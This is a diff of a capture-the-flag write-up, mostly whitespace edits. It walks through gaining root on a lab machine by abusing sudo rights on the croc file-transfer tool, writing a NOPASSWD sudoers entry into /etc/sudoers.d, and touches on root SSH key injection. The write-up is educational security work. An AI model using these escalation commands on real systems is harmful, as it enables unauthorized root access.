@@ -630,9 +630,7 @@ This introduces a strong privilege escalation vector.
 ---
 
 ## Step 16 — Investigating croc
-
 To understand how croc could be abused, I inspected the binary.
-
 ### File Information
   ```bash
     file /usr/local/bin/croc
@@ -659,7 +657,6 @@ To understand how croc could be abused, I inspected the binary.
   - Supports stdout redirection
 
 ### Key Observation that I made:
-
 - croc is a file transfer utility.
 - If executed with:
   ```bash
@@ -680,7 +677,6 @@ This means:
 ---
 
 ## Step 17 — Preparing Root SSH Key Injection
-
 To escalate privileges cleanly, I generated an SSH key pair on Kali:
   ```bash
     ssh-keygen -t rsa -f gameshell_root -N ""
@@ -696,13 +692,11 @@ The objective is to transfer the public key into:
     /root/.ssh/authorized_keys
   ```
 Using the privileged croc binary.
-
 Since croc runs as root when executed with sudo, any received file can be written with root privileges.
 
 ---
 
 ## Step 18 — Re-evaluating the Croc Sudo Misconfiguration
-
 After gaining access as eviden, I ran:
   ```bash
     sudo -l
@@ -725,7 +719,6 @@ At this stage:
 ---
 
 ## Step 19 — Understanding Croc Capabilities
-
 From:
   ```bash
     /usr/local/bin/croc --help
@@ -737,15 +730,12 @@ From:
 - --overwrite → overwrite existing files
 
 Since croc runs as root via sudo, any file written using --out would be written as root.
-
 This is the core vulnerability.
 
 ---
 
 ## Step 20 — Starting a Local Croc Relay (Root)
-
 Because outbound internet was blocked, the public croc relay could not be used.
-
 Instead, I started a local relay server:
   ```bash
     sudo croc relay
@@ -762,7 +752,6 @@ This allowed file transfers entirely inside the machine.
 ---
 
 ## Step 21 — Creating a Malicious Sudoers File
-
 To escalate privileges, I created a file granting full sudo rights:
   ```bash
     echo "eviden ALL=(ALL) NOPASSWD:ALL" > /tmp/rootme
@@ -773,7 +762,6 @@ This file contained:
 ---
 
 ## Step 22 — Writing Into /etc/sudoers.d as Root
-
 In another terminal, I ran croc as root in receive mode:
   ```bash
     sudo croc --relay 127.0.0.1:9009 --overwrite --out /etc/sudoers.d
@@ -801,7 +789,6 @@ Transfer confirmation:
 ---
 
 ## Step 23 — Confirming Privilege Escalation
-
 I rechecked sudo privileges:
   ```bash
     sudo -l
@@ -815,7 +802,6 @@ Full sudo access was successfully granted.
 ---
 
 ## Step 24 — Root Access Achieved
-
 I escalated to root:
   ```bash
     sudo su
@@ -837,19 +823,14 @@ Then retrieved the root flag:
 ---
 
 ## Step 25 — Get User and Root Flags
-
 Now lets move to root directory and cat the root.txt and then move to /home/silo directory and cat the user.txt 
-
 The flags are:
-
   ```bash
     flag{root-REDACTED}
     flag{user-REDACTED}
   ```
 ## Conclusion
-
 ### Summary of the Attack Chain
-
 This machine demonstrated a complete attack path from initial access to full system compromise.
 
 ### Phase 1 — Initial Access
@@ -892,7 +873,6 @@ This machine demonstrated a complete attack path from initial access to full sys
 - Never assume standard CTF structure — verify.
 
 ## Final Thoughts
-
 This machine required logical thinking, controlled pivoting, and careful analysis of sudo misconfigurations. The exploitation was not based on a vulnerability in software, but rather on a misconfiguration — which reflects real-world security issues.
 
 Overall it was a very practical and educational machine.
